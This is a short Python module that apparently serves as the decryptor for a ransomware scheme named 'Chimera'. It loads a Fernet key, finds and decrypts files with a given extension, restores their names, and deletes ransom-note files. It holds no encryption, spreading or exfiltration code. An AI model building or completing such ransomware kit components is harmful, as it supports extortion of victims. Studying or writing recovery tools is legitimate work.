# decryptor.py
# A modular decryption script for Chimera.

import os
from cryptography.fernet import Fernet

def load_key(key_file):
    """
    Loads the decryption key from the specified file.
    :param key_file: Path to the file containing the decryption key.
    :return: The encryption key (bytes).
    """
    print("[*] Loading the decryption key...")
    try:
        with open(key_file, "rb") as f:
            key = f.read()
        print(f"[+] Key loaded from '{key_file}'.")
        return key
    except FileNotFoundError:
        print(f"[!] FATAL: Key file '{key_file}' not found. Cannot proceed.")
        exit()

def find_files(directory, extension):
    """
    Recursively finds all files in the given directory with the specified extension.
    :param directory: Directory to search in.
    :param extension: File extension to look for.
    :return: A list of file paths matching the extension.
    """
    print(f"[*] Searching for files with extension '{extension}' in '{directory}'...")
    matching_files = []
    for root, _, files in os.walk(directory):
        for filename in files:
            if filename.endswith(extension):
                file_path = os.path.join(root, filename)
                matching_files.append(file_path)
    print(f"[+] Found {len(matching_files)} matching files.")
    return matching_files

def delete_ransom_notes(directory, ransom_note_name):
    """
    Deletes ransom notes in the specified directory.
    :param directory: Directory to search for ransom notes.
    :param ransom_note_name: Base name of the ransom note file to delete.
    :return: The number of ransom notes deleted.
    """
    print(f"[*] Searching for ransom notes to delete ('{ransom_note_name}.txt')...")
    notes_deleted = 0
    for root, _, files in os.walk(directory):
        for filename in files:
            if filename == f"{ransom_note_name}.txt":
                file_path = os.path.join(root, filename)
                try:
                    os.remove(file_path)
                    print(f"    [+] Deleted ransom note: {file_path}")
                    notes_deleted += 1
                except Exception as e:
                    print(f"    [!] Failed to delete note {file_path}: {e}")
    print(f"[+] Deleted {notes_deleted} ransom notes.")
    return notes_deleted

def decrypt_files(files, key, encrypted_extension):
    """
    Decrypts all specified files using the provided `key`.
    :param files: A list of encrypted file paths.
    :param key: The decryption key (bytes).
    :param encrypted_extension: The extension to remove during restoration.
    """
    print("[*] Starting file decryption...")
    cipher = Fernet(key)
    decrypted_count = 0

    for file_path in files:
        try:
            with open(file_path, "rb") as f:
                encrypted_data = f.read()

            # Decrypt content
            decrypted_data = cipher.decrypt(encrypted_data)

            # Restore original file name
            original_file_path, _ = os.path.splitext(file_path)
            with open(original_file_path, "wb") as f:
                f.write(decrypted_data)

            # Remove encrypted file
            os.remove(file_path)
            print(f"    [+] Decrypted and restored: {original_file_path}")
            decrypted_count += 1
        except Exception as e:
            print(f"    [!] Error decrypting {file_path}: {e}")

    print(f"[+] Decryption complete: Restored {decrypted_count} files.")
